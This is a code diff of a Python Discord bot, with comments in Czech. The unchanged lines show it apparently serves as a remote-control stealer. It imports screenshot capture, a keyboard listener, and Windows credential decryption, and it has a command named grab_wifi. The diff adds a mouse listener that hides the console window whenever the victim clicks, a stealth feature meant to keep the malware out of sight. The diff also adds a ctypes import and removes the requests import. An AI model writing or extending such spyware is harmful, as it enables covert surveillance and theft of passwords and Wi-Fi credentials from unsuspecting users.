@@ -7,11 +7,11 @@ import asyncio
 import subprocess
 import sqlite3
 import shutil
-import requests
 from discord.ext import commands
 from PIL import ImageGrab
-from pynput import keyboard
+from pynput import keyboard, mouse
 import win32crypt
+import ctypes
 
 # Nastavení prefixu pro příkazy bota
 intents = discord.Intents.default()
@@ -153,6 +153,15 @@ async def grab_wifi(ctx):
 async def stop_bot(ctx):
     await ctx.send("Bot se vypíná...")
     await bot.close()
+
+# Funkce pro skrytí okna při kliknutí
+def hide_window_on_click(x, y, button, pressed):
+    if pressed:
+        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)  # 0 - SW_HIDE
+
+# Nastavení listeneru pro detekci kliknutí myši
+mouse_listener = mouse.Listener(on_click=hide_window_on_click)
+mouse_listener.start()
 
 # Spuštění bota
 @bot.event
